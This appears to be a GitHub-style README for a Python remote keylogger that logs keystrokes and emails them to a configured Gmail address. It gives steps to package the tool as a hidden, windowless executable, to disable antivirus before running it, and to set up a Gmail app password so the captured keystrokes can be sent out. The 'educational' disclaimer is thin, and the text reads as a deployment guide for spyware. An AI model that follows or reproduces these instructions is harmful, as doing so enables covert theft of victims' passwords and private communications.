# Python Remote Keylogger

**Disclaimer:** This project is intended for educational purposes only. Use this software responsibly and ethically. Unauthorized use or distribution for malicious purposes is strictly prohibited.

## Overview

This Python Remote Keylogger is designed for educational purposes to demonstrate how keyloggers work. It consists of two main components:

1. **Keylogger**: Captures keystrokes and maintains a log file locally.
2. **Email Sender**: Sends the captured keystrokes to a specified email address.

**Note:** Before using the keylogger, ensure that your antivirus software is turned off, as it may interfere with the functioning of the keylogger.

## Installation

1. First, install the required dependencies using pip:

   ```bash
   pip install pyinstaller
Use the following command to convert the Python script into an executable file. Replace desired_name with your preferred name and filename.py with the name of your Python script.

    ```bash
   pyinstaller --onefile --noconsole --name desired_name filename.py

## Configuration
Before using the email sending functionality, configure the Gmail account:

Enable 2-step verification for the sender's Gmail account.
Obtain an "App Password" from Google's Security settings. This will be used as the password in the configuration.
## Usage
Run the generated executable file after disabling your antivirus.
Ensure that the command prompt's path is set to the location where the executable file is located.
Caution: Do not use this software for any malicious purposes. Respect the privacy and security of individuals.

## Contribution
Contributions to improve the educational value or security aspects of this project are welcome. However, any attempt to use or promote this project for malicious purposes will not be tolerated.
  

